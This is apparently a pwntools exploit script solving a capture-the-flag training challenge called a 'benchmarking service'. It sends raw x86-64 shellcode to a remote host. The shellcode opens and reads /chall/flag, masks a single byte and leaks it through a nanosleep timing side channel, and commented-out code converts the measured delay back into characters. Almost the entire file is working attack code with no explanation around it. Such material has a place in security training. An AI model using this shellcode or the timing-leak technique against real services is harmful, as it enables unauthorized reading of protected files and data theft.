from pwn import *

asm_code = """
mov rbx, rsi
xor rdx, rdx
xor rsi, rsi
mov rdi, rbx
add rdi, 0x39
mov rax, 0x2
syscall
mov rdi, rax
mov rdx, 30
mov rsi, rbx
add rsi, 200
xor rax, rax
syscall



mov rax, 0x23
mov rdi, [rsi]
mov [rsi], rdi
mov rdi, rsi
add rsi, 0x20
syscall
"""

context.arch = 'amd64'

offset_file_name = b"\x82"
offset_character_in_string = b"\x29"
file_path = b"/chall/flag\x00"
symbols_list = [36, 37, 38] + [i for i in range(40, 91)] + [95] + [i for i in range(97, 126)]

open_shellcode = b"\x48\x89\xF3\x48\x31\xD2\x48\x31\xF6\x48\x89\xDF\x48\x81\xC7" + offset_file_name + b"\x00\x00\x00\x48\xC7\xC0\x02\x00\x00\x00\x0F\x05"
read_shellcode = b"\x48\x89\xC7\x48\xC7\xC2\x30\x00\x00\x00\x48\x89\xDE\x48\x81\xC6\xDD\x00\x00\x00\x48\x31\xC0\x0F\x05"
and_shellcode = b"\x48\x83\xC6" + offset_character_in_string + b"\x48\xc7\xc7\xff\x00\x00\x00\x48\x8b\x36\x48\x21\xfe"
exit_shellcode = b"\x48\xC7\xC7\x00\x00\x00\x00\x48\xC7\xC0\x3C\x00\x00\x00\x0F\x05"
nanosleep_shellcode = b"\x48\x89\xD9\x48\x81\xC1\xFF\x00\x00\x00\x48\x01\x11\x48\x89\xCF\x48\x31\xF6\x48\xC7\xC0\x23\x00\x00\x00\x0F\x05"

#p = process("./benchmarking_service")

"""gdb.attach(p, '''
   b 0x040132e 
''')
input("wait")"""

elem_list = b'a'
p = remote("bin.training.offdef.it", 5001)
p.send(open_shellcode + read_shellcode + and_shellcode + b"\x48\xC7\xC2" + elem_list + b"\x00\x00\x00" + b"\x48\x39\xD6\x0F\x85\x10\x00\x00\x00" + exit_shellcode + nanosleep_shellcode + file_path + b"\x00"*1024)

p.interactive()



'''p.recvuntil(b"""======= BENCHMARKING SERVICE V1.0 =======
Shellcode: Testing the performance of your shellcode...
Time: """)
time.sleep(0.1)
timeElapsed = p.read(8)
timeElapsed = float(timeElapsed)
timeElapsed = timeElapsed - 0.08
nanoseconds = timeElapsed*10**9
asciiCode = round(nanoseconds/24000000)
chr = chr(asciiCode)
print("Official: " + chr)
chr = chr(asciiCode - 1)
print("Previous: " + chr)
chr = chr(asciiCode + 1)
print("Next: " + chr)'''